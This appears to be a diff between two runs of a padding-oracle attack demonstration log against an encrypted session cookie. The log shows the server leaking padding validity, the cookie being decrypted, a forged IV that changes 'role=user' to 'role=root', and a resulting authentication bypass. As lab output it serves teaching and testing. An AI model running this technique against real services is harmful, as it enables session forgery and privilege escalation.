@@ -1,7 +1,8 @@
 == 1. Acquire the encrypted session cookie ==
 GET /session -> HTTP 200
+run captured at = 2026-10-20T22:16:21+08:00
 cookie bytes = 48 (3 AES blocks)
-iv           = e7b27fd7461039d0957221d4fa4108c6
+iv           = a0f0d20d6d7635215785887d94e17319
 
 == 2. Confirm that padding validity is observable ==
 original cookie       -> HTTP 200 {'access': 'user dashboard', 'role': 'user'}
@@ -11,12 +12,12 @@ one flipped ct byte   -> HTTP 400 {'error': 'invalid padding'}
 block 1: b'role=user;uid=10'
 block 2: b'01;ok=1\t\t\t\t\t\t\t\t\t'
 recovered plaintext = role=user;uid=1001;ok=1
-oracle queries      = 4713
+oracle queries      = 3707
 
 == 4. Forge the first plaintext block without the key ==
 original block = b'role=user;uid=10'
 target block   = b'role=root;uid=10'
-forged iv      = e7b27fd7461725da937221d4fa4108c6
+forged iv      = a0f0d20d6d71292b5185887d94e17319
 
 == 5. Verify the authentication bypass ==
 before forgery -> HTTP 200 {'access': 'user dashboard', 'role': 'user'}
